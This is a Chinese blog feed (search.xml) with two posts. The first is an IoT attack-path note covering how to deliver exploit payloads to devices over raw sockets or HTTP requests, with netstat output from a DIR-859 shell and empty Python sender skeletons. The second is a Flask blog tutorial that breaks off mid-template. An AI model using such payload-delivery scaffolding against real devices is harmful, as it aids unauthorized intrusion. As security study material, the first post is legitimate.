<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>IOT设备的攻击路径思考</title>
      <link href="/2022/04/26/IOT%E8%AE%BE%E5%A4%87%E7%9A%84%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E6%80%9D%E8%80%83/"/>
      <url>/2022/04/26/IOT%E8%AE%BE%E5%A4%87%E7%9A%84%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近在测试IOT设备的时候，在逆向之后，找到漏洞，如何攻击就成了一个大问题，发包？怎么发？如何构造？这篇文章就来总结关于IOT设备的攻击路径，我们总得通过一个路径来完成一个攻击，一般情况下有两种方法，第一种是通过无线，另一个就是通过一些物理的手段，拿个榔头（不是）…，通过物理上的接口，这个接口可以是USB，可以是SD卡，这就与目标设备的底座更加相关一些，但是物理接口还是有很大的局限性，毕竟你得接触到设备，而且物理接口也种类繁多，所以这里不介绍，本文更多聚焦于无线这个层面，回到刚刚那个问题，发包？怎么发？如何构造？本文主要是解决这几个问题！</p></blockquote><h2 id="发包？怎么发？"><a href="#发包？怎么发？" class="headerlink" title="发包？怎么发？"></a>发包？怎么发？</h2><p>在PWN中通常编写攻击脚本的时候，都是通过remote( )连接，然后send( )来发送攻击的载荷，send( )这么一个操作，其实就是往目标服务器发送一些数据的操作，不用pwntools能发吗？肯定能，毕竟remote( )和send( )函数本质还是socket那一套东西，pwntools只是做了一层封装，只用remote(“IP”，port)一条命令就创建了一个TCP/UDP的socket，然后直接调用socket就可以发送数据了</p><ul><li><a href="https://docs.pwntools.com/en/stable/tubes/sockets.html?highlight=remote">pwntools 文档之remote介绍</a></li></ul><p>所以其中一条路径就是socket发包这条路，不管是UDP还是TCP的socket，都是往目标设备所监听的端口上发送数据，这个端口的背后就是二进制程序或者可以说是服务，本质上是一套逻辑，除了socket发，还有另一个方式是requests，笔者的理解它是往HTTP服务端发送数据，背后同样也是有一套逻辑来处理，不过requests发包和socket的发包是有区别的，笔者个人理解有两点：</p><ul><li>层次的不同，requests属于应用层中的HTTP的东西，socket属于传输层和网络层之间的东西，很容易知道socket比requests更底层一些，但是再怎么说HTTP层往下也是socket来实现的，只不过也是封了一层，让HTTP协议看起来更简单，一个request，一个respond，只不过requests请求的是一个域名或者说是一个url，然后通过dns解析成对于的IP地址也就是服务器的IP地址，然后再把报头加上数据载荷发过去，不过两者在发的时候都需要加上报头的一些参数的值才能到底漏洞点所在的位置</li><li>背后处理的目标问题，requests发包最终会到80口的webserver，webserver会fork一个CGI进程来处理，而socket很大可能就单纯的一个二进制程序，但也不排除它与二进制程序传递参数<ul><li><a href="https://larry.ngrep.me/2020/02/03/iot-web-server-cgi-handler-analysis/">常见嵌入式Web服务器CGI处理功能简要分析</a></li><li><a href="https://blog.csdn.net/qq_33369979/article/details/109106817">CGI协议流程详细介绍</a></li></ul></li></ul><p>知道了有两种发包思路，也就有了两种路径，那在面对真实的设备的时候，如何去确定目标设备的这个漏洞到底是用socket来发，还是用requests来发呢？这里提两种方法：</p><ul><li>逆向，回溯整个触发的过程</li><li>拿到shell之后查看监听端口背后的服务</li></ul><p>对于<strong>第一种</strong>方法：</p><p>只能慢慢的去逆向，看他是通过HTTP来接收它的数据载荷然后处理的，还是通过socket接收来处理的，往往回溯都有一个很明显的特征，比如socket的创建，设置参数等等等</p><p>对于<strong>第二种</strong>方法：</p><p>就是去看看监听的端口，用netstat来看看有那些端口正在监听的端口，某个服务确实是在某个端口上监听，那就可以确认它的确是用socket来发的，有时候netstat不能查看对应的进程名，解决的方法通常是：传入一个支持netstat的二进制程序来查看对应进程名的busybox</p><p>以DIR-859为例，下面是shell中打印监听端口的信息，IP和端口以及所对应的服务的PID和名称都列出来了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># netstat -npl</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 192.168.0.1:49152       0.0.0.0:*               LISTEN      3959/httpd</span><br><span class="line">tcp        0      0 0.0.0.0:5449            0.0.0.0:*               LISTEN      18591/proxyd</span><br><span class="line">tcp        0      0 192.168.0.1:80          0.0.0.0:*               LISTEN      3959/httpd</span><br><span class="line">tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      3959/httpd</span><br><span class="line">tcp        0      0 192.168.0.1:45555       0.0.0.0:*               LISTEN      2472/hostapd</span><br><span class="line">tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      3369/dnsmasq</span><br><span class="line">tcp        0      0 192.168.0.1:8182        0.0.0.0:*               LISTEN      3959/httpd</span><br><span class="line">tcp        0      0 0.0.0.0:63481           0.0.0.0:*               LISTEN      689/fakedns</span><br><span class="line">tcp        0      0 192.168.0.1:443         0.0.0.0:*               LISTEN      2854/stunnel</span><br><span class="line">tcp        0      0 fe80::e66f:13ff:fe35:bd34:49152 :::*                    LISTEN      3959/httpd</span><br><span class="line">tcp        0      0 :::9999                 :::*                    LISTEN      12515/telnetd</span><br><span class="line">tcp        0      0 fe80::e66f:13ff:fe35:bd34:80 :::*                    LISTEN      3959/httpd</span><br><span class="line">tcp        0      0 :::53                   :::*                    LISTEN      3369/dnsmasq</span><br><span class="line">tcp        0      0 fe80::e66f:13ff:fe35:bd34:8182 :::*                    LISTEN      3959/httpd</span><br><span class="line">tcp        0      0 :::63481                :::*                    LISTEN      689/fakedns</span><br><span class="line">udp        0      0 0.0.0.0:137             0.0.0.0:*                           3982/nameresolv</span><br><span class="line">udp        0      0 0.0.0.0:51342           0.0.0.0:*                           807/arpmonitor</span><br><span class="line">udp        0      0 0.0.0.0:53              0.0.0.0:*                           3369/dnsmasq</span><br><span class="line">udp        0      0 0.0.0.0:51815           0.0.0.0:*                           3285/mDNSResponderP</span><br><span class="line">udp        0      0 0.0.0.0:54760           0.0.0.0:*                           2472/hostapd</span><br><span class="line">udp        0      0 0.0.0.0:5353            0.0.0.0:*                           3285/mDNSResponderP</span><br><span class="line">udp        0      0 0.0.0.0:5355            0.0.0.0:*                           3982/nameresolv</span><br><span class="line">udp        0      0 0.0.0.0:1900            0.0.0.0:*                           3959/httpd</span><br><span class="line">udp        0      0 0.0.0.0:1900            0.0.0.0:*                           2472/hostapd</span><br><span class="line">udp        0      0 0.0.0.0:49007           0.0.0.0:*                           807/arpmonitor</span><br><span class="line">udp        0      0 0.0.0.0:63481           0.0.0.0:*                           689/fakedns</span><br><span class="line">udp        0      0 :::36006                :::*                                3285/mDNSResponderP</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>上面所讲到的发包模型都是在IP层往上的构包，那想要控制更底层的发包，那就得用scapy这个python的库了，但笔者暂时还没遇到，就姑且放一放好了…</p><h2 id="构造报文"><a href="#构造报文" class="headerlink" title="构造报文"></a>构造报文</h2><p>按照上面的说法，那就有两种构造报文的思路，一个是socket，另一个即是request，构造起来都不困难，socket的构造和socket的通信十分相似，可参考《网络编程之socket编程》，关键是发送的数据是什么？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span>(<span class="params">ip,port,pay</span>):</span></span><br><span class="line">    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sock.sendto(pay,(ip, port))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sock.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip = <span class="string">&quot;&quot;</span></span><br><span class="line">    port = </span><br><span class="line">    payload = build_header()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    send_payload(ip,port,payload)</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>request的构造也同样简单，只要调用request包，然后发包即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot; &quot;</span></span><br><span class="line">url = <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>写完整个总结下来，对整个攻击的路径也有一定的深入了，以后还有其他的攻击路径还得总结上，总得来说网络层面上面的攻击路径并不新鲜，说来说去还是那几种，但后续有没更底层的打法，只能待后续的跟进与学习了….</p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask · 从零开始构建一个简易的个人博客</title>
      <link href="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前段时间学习渗透的时候，感觉SSTI模板注入很迷糊，就想着来研究一下flask框架来加深一下SSTI模板注入的理解，然后一发不可收拾，萌生了开发一个搭建个简易博客的想法，接下来就从零开始构建一个简单的博客吧！</p></blockquote><h2 id="Hello，Flask！"><a href="#Hello，Flask！" class="headerlink" title="Hello，Flask！"></a>Hello，Flask！</h2><p>flask简单来说就是一个WEB框架，那什么是WEB框架呢？在之前的学习当中，前端我们可以使用html，CSS，JavaScript，后端可以使用PHP来编写，最终实现一个WEB网站，那随着时代的发展，这种设计模式慢慢变得有点落后，就出现了一个相当于管理员的应用，也就是前面讲到的WEB框架，它可以帮助你完成很多繁琐的事情，如：路由，响应，请求等等功能，<strong>让你更加的注重网站的开发，剩下的事情统统都交给它就好了！</strong></p><p>现在的WEB框架已经演变出了一个完整的体系—-<strong>MTV（Model Template View）也就是模型，模板和视图，这是WEB框架的核心</strong>，一切都是围绕这三个部分来构建的，模型是指数据库模型，用于处理后端的数据，模板是指前端页面的展示，它和URL的联系是通过视图函数来实现的，也可以称他为路由，后面会慢慢的认识到这个体系的精巧！</p><img src="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/8.png" class=""><p>最后，其实在python的世界里不单单只有flask这一个框架，比较常见的还有tornado，Django，flask与它们的区别就在于量级和线程，也就是说flask相较于它们来说比较简单，更容易上手一些，所以研究web框架的第一站我就选择了flask来进行研究！</p><h3 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h3><p>在创建第一个flask应用程序之前，还得介绍一个环境，就是虚拟环境，为啥需要这个环境呢？其实很简单，<strong>就是防止函数库冲突</strong>，我们都知道在写一些比较大型的python应用程序的时候都需要导入库，那问题就来了，今天这个项目需要flask1.0来写，我们就去装一个flask1.0，明天那个项目需要flask1.1.2来写，我们就去装一个flask1.1.2，可能在某些读者看来这无伤大雅，只是一个卸载和安装的问题，可是一个项目并不可能只导入一个库，当几十个库都需要更换的时候，这个工作量就显得有点大了！</p><p>那如何使用和安装一个虚拟环境呢？这也很简单，在开发的过程当中我们都会使用IDE，也就是学python都会用的Pycharm，它其实已经为减掉了大部分的繁琐工作，当New Project的时候就已经创建好了一个虚拟的环境，你也可以选择下面的Existing interpreter来加载已经存在的虚拟环境，之后你所安装的所有库都归这个虚拟环境所有！（Pycharm社区版没用New Flask Project的功能，需要自行pip安装）</p><img src="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1.png" class=""><p>若是需要通过命令行来创建虚拟机环境可以参照下面的链接：</p><p><a href="https://blog.csdn.net/yawei_liu1688/article/details/111689527">linux创建虚拟环境（python虚拟环境）</a></p><p><a href="https://blog.csdn.net/lilygg/article/details/116452984">创建Linux虚拟环境的两种方式 venv 与 virtualenvwrapper 以及 Pycharm 如何连接 Linux虚拟环境</a></p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p>创建完项目之后，可以看到下面的包结构：</p><blockquote><p>— 项目名称</p><p>​        |—- static</p><p>​        |—- templates</p><p>​        |—- app.py</p></blockquote><p>static通常来说都是存放CSS，JavaScript脚本，图片等等，templates存放html，app.py就为flask项目的启动文件，在编写代码的时候最好按照这种模式来存放文件，因为在后面可以看到在一些函数中已经做了类似宏定义的东西，轻易打破这种设定会导致一下奇奇怪怪的问题产生….</p><h2 id="运行Flask服务器！"><a href="#运行Flask服务器！" class="headerlink" title="运行Flask服务器！"></a>运行Flask服务器！</h2><p>点开app.py其实里面已经写好了一段代码，这个代码的意思后面再慢慢道来，我们先将其运行起来，可以看到在下面出现一个链接：<a href="http://localhost:5000/%EF%BC%8C%E7%82%B9%E5%BC%80%E4%B9%8B%E5%90%8E%EF%BC%8C%E4%B8%80%E4%B8%AAHello">http://localhost:5000/，点开之后，一个Hello</a> World！就出现在屏幕上！！！这算是我们的第一个flask程序！</p><img src="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/2.png" class=""><h2 id="为什么要传递-name-？"><a href="#为什么要传递-name-？" class="headerlink" title="为什么要传递__name__？"></a>为什么要传递<code>__name__</code>？</h2><p>在刚刚的代码中，第一行就是下面这个代码，它去创建一个类，并将<code>__name__</code>传递进去，我们都知道<code>__name__</code>是当前模块的名字</p><p><a href="https://blog.csdn.net/qq_41589031/article/details/110134349"><code>__name__</code>的用法</a></p><p>这到底在干嘛呢？按住Ctrl点击Flask，我们进源码一探究竟！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure><p>进来看到Flask的描述，下面摘取一些比较重要的描述：</p><blockquote><p>The flask object implements a WSGI application and acts as the central object.  It is passed the name of the module or package of the application.  Once it is created it will act as a central registry for the view functions, the URL rules, template configuration and much more.</p><p>……</p><p>The idea of the first parameter is to give Flask an idea of what belongs to your application.  This name is used to find resources on the filesystem, can be used by extensions to improve debugging information and a lot more.</p><p>So it’s important what you provide there.  If you are using a single module, <code>__name__</code> is always the correct value.  If you however are using a package, it’s usually recommended to hardcode the name of your package there.</p><p>……</p><p>Why is that?  The application will work even with <code>__name__</code>, thanks to how resources are looked up.  However it will make debugging more painful.  Certain extensions can make assumptions based on the import name of your application.  For example the Flask-SQLAlchemy extension will look for the code in your application that triggered an SQL query in debug mode.  If the import name is not properly set up, that debugging information is lost.  (For example it would only pick up SQL queries in <code>yourapplication.app</code> and not <code>yourapplication.views.frontend</code>)</p></blockquote><p>翻译一下可知：</p><ul><li>Flask启动了WSGI一个应用<ul><li><a href="https://zhuanlan.zhihu.com/p/95942024">WSGI到底是什么？</a></li></ul></li><li>Flask是通过第一个参数，也就是<code>__name__</code>来查找资源</li><li>如果没有传递<code>__name__</code>会丢失很多调试信息</li></ul><p>到这也就知道为啥要传递<code>__name__</code>这个参数了，Flask服务器是通过模块的名字来定位程序的位置的，并作为起点来计算绝对路径，往下翻看到<code>__init__</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">    self,</span></span></span><br><span class="line"><span class="params"><span class="function">    import_name: <span class="built_in">str</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    static_url_path: t.<span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    static_folder: t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, os.PathLike]] = <span class="string">&quot;static&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    static_host: t.<span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    host_matching: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    subdomain_matching: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    template_folder: t.<span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="string">&quot;templates&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    instance_path: t.<span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    instance_relative_config: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    root_path: t.<span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span></span><br></pre></td></tr></table></figure><p>除了import_name其他变量都是有默认值的，看到下面的static_folder和template_folder，回过头想想当初的项目结构，是不是就明白为啥需要遵循那样的规则？</p><h3 id="配置调试模式"><a href="#配置调试模式" class="headerlink" title="配置调试模式"></a>配置调试模式</h3><p>在不做任何配置的时候，Flask是默认不开启调试模式的，可以通过打印app.config来查看：</p><img src="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/3.jpg" class=""><p>开启的方法有三种：</p><ul><li>直接在Pycharm的配置文件中开启即可：Run -&gt; Edit Configurations… -&gt; FLASK_DUBUG</li><li>在app.py加入配置：app.config[‘DUBUG’] = True</li><li>修改启动的参数：app.run(debug=True)</li></ul><p>讲完了开启的方法，那开启了调试模式有啥用呢？</p><ul><li>即平时修改代码后项目不会自动更新代码，如果开启调试模式之后，项目检查到被修改就会自动重新启动更新，很方便有没有！</li><li>同时在发生服务器中有代码错误的时候，会将错误信息展示出来，方便开发人员定位错误</li></ul><p>为了防止项目耦合，在创建一个config.py文件存放配置信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    ENV = <span class="string">&quot;development&quot;</span></span><br><span class="line">DUBUG = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>在app.py导入配置文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> Config</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">app.config.from_object(Config)</span><br></pre></td></tr></table></figure><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p>路由顾名思义就是指路的，当浏览器访问<a href="http://localhost:5000/%E7%9A%84%E6%97%B6%E5%80%99%E5%8F%91%E9%80%81%E4%BA%86%E4%BB%80%E4%B9%88%E5%91%A2%EF%BC%9F%E7%AD%94%E6%A1%88%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E5%BD%93%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%E7%9A%84%E6%97%B6%E5%80%99%E5%B0%B1%E6%84%8F%E5%91%B3%E7%9D%80%E5%AE%83%E5%90%91Flask%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E9%80%81%E4%BA%86%E8%AF%B7%E6%B1%82%EF%BC%8CFlask%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A0%B9%E6%8D%AEURL%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%9C%80%E5%90%8E%E8%BF%94%E5%9B%9E%EF%BC%8C%E9%82%A3%E4%B9%88%E9%97%AE%E9%A2%98%E5%8F%88%E6%9D%A5%E4%BA%86%EF%BC%9AFlask%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E8%BF%99%E4%B9%88%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E7%9A%84%E5%91%A2%EF%BC%9F%E6%B2%A1%E9%94%99%EF%BC%81%E5%B0%B1%E6%98%AF%E8%A3%85%E9%A5%B0%E5%99%A8%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%B8%8B%E9%9D%A2%E7%9A%84app.route%E9%87%8C%E9%9D%A2%E7%9A%84%E5%8F%82%E6%95%B0%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%98%AF%E2%80%9C/%E2%80%9D%EF%BC%8C%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%BD%93%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AF%B7%E6%B1%82%E2%80%9C/%E2%80%9D%E7%9A%84%E6%97%B6%E5%80%99%E5%B0%B1%E4%BC%9A%E8%BF%9B%E5%88%B0%E8%AF%A5%E8%A3%85%E9%A5%B0%E5%99%A8%E5%BA%95%E4%B8%8B%E7%9A%84%E8%A7%86%E5%9B%BE%E5%87%BD%E6%95%B0%E5%BD%93%E4%B8%AD%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E7%9A%84%E6%98%AF%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E7%84%B6%E5%90%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8E%A5%E5%8F%97Flask%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%94%E5%9B%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E5%B9%B6%E8%BF%9B%E8%A1%8C%E6%98%BE%E7%A4%BA%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%B9%8B%E5%89%8D%E7%9C%8B%E5%88%B0%E7%9A%84Hello">http://localhost:5000/的时候发送了什么呢？答案很简单，当浏览器访问的时候就意味着它向Flask服务器发送了请求，Flask服务器根据URL找到对应的处理函数，然后执行，最后返回，那么问题又来了：Flask服务器是这么找到对应的处理函数的呢？没错！就是装饰器，也就是下面的app.route里面的参数，里面是“/”，就是说当浏览器请求“/”的时候就会进到该装饰器底下的视图函数当中，因为函数返回的是一个字符串，然后浏览器接受Flask服务器返回的数据并进行显示，也就是之前看到的Hello</a> World!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br></pre></td></tr></table></figure><p>我们已经知道浏览器会接受Flask服务器返回的数据并进行显示，刚刚返回的是字符串，那html它能成功接收并显示吗？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;font color=&quot;red&quot;&gt;Hello World!&lt;/font&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>答案肯定是可以的：</p><img src="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/4.png" class=""><p>通过F12查看Response Headers中的Content-Type可以发现它是text/html，<strong>其实它本质将接收的内容转换成html然后再显示！</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 37</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Date: Sun, 27 Mar 2022 07:17:03 GMT</span><br><span class="line">Server: Werkzeug/2.0.3 Python/3.8.2</span><br></pre></td></tr></table></figure><p>那除了html格式还要其他格式吗？有的，也就是json格式，当返回的是一个字典的时候它为<code>application/json</code>格式的：</p><img src="/2022/04/12/Flask-%C2%B7-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/5.jpg" class=""><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>在上节中，通过返回一个字符串来让浏览器渲染成text/html，所以可以直接返回一个html让浏览器渲染，但一般不会在视图函数中直接写html代码，因为当项目逐渐变大的时候，html也开始变得十分的复杂，这样就会让视图函数特别的臃肿，那么模板的概念也就引入进来了！所有的html都放在templates中，下面创建一个index.html，可以看到下面的html多了几个陌生的语法，这是动态网页的灵魂，可以通过动态传入相应的值让浏览器来渲染，用法其实很简单，（1）用来放置变量，（2）来放置控制语句，需要注意的是结尾有个（3）来标记控制语句的结束</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        &#123;% if title %&#125; </span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125; - Myblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to 